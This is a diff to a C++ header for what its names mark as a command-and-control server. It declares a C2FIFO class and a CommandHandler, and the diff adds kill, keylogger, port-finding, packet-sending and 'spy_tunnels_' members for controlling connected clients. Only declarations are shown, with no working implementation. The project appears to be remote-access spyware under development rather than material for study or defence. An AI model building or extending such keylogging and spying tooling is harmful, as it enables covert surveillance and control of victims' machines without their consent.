@@ -21,6 +21,7 @@
 #include <filesystem>
 #include <chrono>
 #include <thread>
+#include "common.hpp"
 #include "event_logger.hpp"
 #include "server_macros.hpp"
 #include "client_handler.hpp"
@@ -36,8 +37,6 @@
 #define ARG_TYPE_STRING 0x1B
 #define ARG_TYPE_SET 0x1C
 
-#define MAX_COMMAND_LEN 256
-
 class CommandHandler;
 
 class C2FIFO {
@@ -48,12 +47,6 @@ public:
     int fd_in;
     int fd_out;
 };    
-
-// If command needs to be send to the client
-enum NumericalClientCommand {
-    TEST = 0b00000001,
-    KILL = 0b00000010
-};
 
 struct Argument {
     int arg_num_;
@@ -91,6 +84,7 @@ public:
         std::atomic<bool>* __p_shutdown_flag,
         int* __p_user_verbosity
     );
+    ~CommandHandler();
     void execute_command(char* __cmd, int __len);
 private:
     int parse_command(const std::string& __root_cmd);
@@ -102,10 +96,15 @@ private:
     void list();
     void set_verbosity();
     void show_verbosity();
+    void kill();
+    void keylogger();
 
-    void send_client(uint8_t __command, int __client_index);
-    void send_client(uint8_t __command);
+    void find_open_port();
+    void send_packet(uint16_t __packet, int __client_index);    
+    void send_client(CommandCode __command, uint8_t __port, int __client_index);
+    void send_client(CommandCode __command);
     void cleanup();
+    void cleanup_tunnels();
 private:
     std::vector<ClientHandler*>* p_clients_;
     EventLog* p_event_log_;
@@ -116,6 +115,7 @@ private:
     int selected_client_;
     std::string cmd_;
     std::unordered_map<int, std::any> arg_map_;
+    std::vector<std::thread> spy_tunnels_;
 };
 
 #endif // COMMAND_HANDLER_HPP
